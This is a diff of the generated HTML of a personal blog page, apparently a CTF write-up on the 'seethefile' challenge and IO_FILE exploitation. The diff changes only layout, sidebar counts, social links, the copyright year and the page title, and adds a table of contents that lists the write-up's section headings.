+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -603,7 +618,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">62</span>
+                    <span class="site-state-item-count">90</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -677,7 +692,13 @@
                     
                       
                     
-                    <span class="site-state-item-count">18</span>
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">22</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
@@ -692,16 +713,6 @@
               
                 <span class="links-of-author-item">
                   <a href="mailto:linmq006@gmail.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-                  
-                </span>
-              
-                <span class="links-of-author-item">
-                  <a href="https://weibo.com/weiweichenlun/" target="_blank" title="Weibo"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
-                  
-                </span>
-              
-                <span class="links-of-author-item">
-                  <a href="https://www.zhihu.com/people/yuuoniy/activities" target="_blank" title="Zhihu"><i class="fa fa-fw fa-zhihu"></i>Zhihu</a>
                   
                 </span>
               
@@ -729,6 +740,22 @@
       </section>
 
       
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#seethefile"><span class="nav-number">1.</span> <span class="nav-text">seethefile</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析程序"><span class="nav-number">1.1.</span> <span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#泄露地址"><span class="nav-number">1.2.1.</span> <span class="nav-text">泄露地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#构造-FILE"><span class="nav-number">1.2.2.</span> <span class="nav-text">构造 FILE</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#推荐链接"><span class="nav-number">1.3.</span> <span class="nav-text">推荐链接</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
 
       
 
@@ -744,7 +771,7 @@
       <div class="footer-inner">
         <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
-<div class="copyright">&copy; 2017 – <span itemprop="copyrightYear">2018</span>
+<div class="copyright">&copy; 2017 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-user"></i>
   </span>
@@ -756,7 +783,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="Symbols count total">126k</span>
+    <span title="Symbols count total">169k</span>
   
 
   
@@ -765,7 +792,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="Reading time total">1:54</span>
+    <span title="Reading time total">2:34</span>
   
 </div>
 
@@ -903,7 +930,7 @@
       var disqus_config = function () {
         this.page.url = 'https://yuuoniy.github.io/2018/08/14/seethefile-writeup/';
         this.page.identifier = '2018/08/14/seethefile-writeup/';
-        this.page.title = 'seethefile-writeup';
+        this.page.title = 'CTF | IO_FILE 相关利用';
         };
       function loadComments () {
         var d = document, s = d.createElement('script');
